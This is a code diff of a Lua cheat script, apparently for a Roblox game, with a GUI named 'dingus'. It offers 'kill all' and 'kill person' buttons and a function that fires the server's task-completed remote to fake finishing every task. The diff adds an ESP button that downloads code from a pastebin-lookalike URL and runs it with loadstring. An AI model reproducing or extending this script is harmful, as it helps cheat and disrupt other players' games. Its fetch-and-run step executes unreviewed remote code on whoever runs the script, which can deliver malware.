@@ -111,20 +111,34 @@ local Notify = function(Name, Content, Time)
     })
 end
 
+local AllTasks = function()
+    for i = 1, 25 do
+        game.ReplicatedStorage.Remotes.InvokeTaskCompleted:InvokeServer(i)
+    end
+end
+
 local goober = library:CreateWindow({
     Name = "dingus",
 })
 
-local general = goober:CreateTab({
-    Name = "general"
+local Combat = goober:CreateTab({
+    Name = "Main"
 })
 
-local hidersection = general:CreateSection({
+local Esp = goober:CreateTab({
+    Name = "Esp GUI"
+})
+
+local hidersection = Combat:CreateSection({
     Name = "hider"
 })
 
-local shootersection = general:CreateSection({
+local shootersection = Combat:CreateSection({
     Name = "hunter"
+})
+
+local espsection = Esp:CreateSection({
+    Name = "Esp Script"
 })
 
 shootersection:AddButton({
@@ -132,17 +146,6 @@ shootersection:AddButton({
     Callback = function()
         killplayer("all")
         Notify("Dingus", "Kill All Execute", 5)
-    end
-})
-
-shootersection:AddToggle({
-    Name = "Auto kill all",
-    Callback = function(State)
-        getgenv().KillAllLoop = State
-        while KillAllLoop do
-                killplayer("all")
-                task.wait(8)
-        end
     end
 })
 
@@ -169,6 +172,13 @@ shootersection:AddToggle({
     end
 })
 
+espsection:AddButton({
+    Name = "Esp Player",
+    Callback = function()
+        loadstring(Game:HttpGetAsync(("https://pastebinp.com/raw/iv9qAHZP")))()
+    end
+})
+
 shootersection:AddTextbox({
     Name = "kill person",
     Flag = "goober"
@@ -178,40 +188,15 @@ shootersection:AddButton({
     Name = "kill him",
     Callback = function()
         killplayer(library.Flags["goober"])
-    end
-})
-
-hidersection:AddButton({
-    Name = "legit auto task (really buggy for some reason)",
-    Callback = function()
-        for i = 1, 20 do
-            game.ReplicatedStorage.Remotes.InvokeTaskCompleted:InvokeServer(i)
-        task.wait(2)
-        end
+        Notify("Dingus", "Kill Player Execute", 5)
     end
 })
 
 hidersection:AddButton({
     Name = "All Tasks",
     Callback = function()
-        for i = 1, 50 do
-            game.ReplicatedStorage.Remotes.InvokeTaskCompleted:InvokeServer(i)
-        end
-        Notify("Dingus", "Win Execute", 5)
-    end
-})
-
-hidersection:AddToggle({
-    Name = "Auto All Tasks",
-    Callback = function(State)
-        getgenv().AllTasksLoop = State
-        while AllTasksLoop do
-                for i = 1, 50 do
-            game.ReplicatedStorage.Remotes.InvokeTaskCompleted:InvokeServer(i)
-                task.wait()
-                end
-                task.wait()
-        end
+        AllTasks()
+        Notify("Dingus", "All Tasks Execute", 5)
     end
 })
 
